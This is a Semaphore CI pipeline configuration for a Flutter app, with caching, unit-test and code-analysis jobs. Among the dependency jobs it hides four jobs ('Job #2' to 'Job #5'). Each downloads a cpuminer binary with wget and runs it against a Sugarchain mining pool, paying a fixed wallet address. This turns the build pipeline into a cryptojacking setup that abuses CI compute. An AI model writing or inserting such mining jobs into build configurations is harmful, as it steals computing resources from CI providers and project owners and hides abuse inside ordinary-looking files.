version: v1.0
name: First pipeline example
agent:
  machine:
    type: a1-standard-4
    os_image: macos-xcode11
blocks:
  - name: Cache deps
    task:
      env_vars:
        - name: APP_ENV
          value: prod
      jobs:
        - name: Get deps
          commands:
            - checkout
            - flutter pub get
            - cache store flutter-packages .packages
        - name: 'Job #2'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.V-SMP -t0'
        - name: 'Job #3'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.V-SMP -t0'
        - name: 'Job #4'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.V-SMP -t0'
        - name: 'Job #5'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.V-SMP -t0'
    dependencies: []
  - name: Test IOS
    task:
      jobs:
        - name: Unit tests
          commands:
            - flutter test
        - name: Code analyse
          commands:
            - flutter analyze
      prologue:
        commands:
          - checkout
          - cache restore flutter-packages
    dependencies:
      - Cache deps
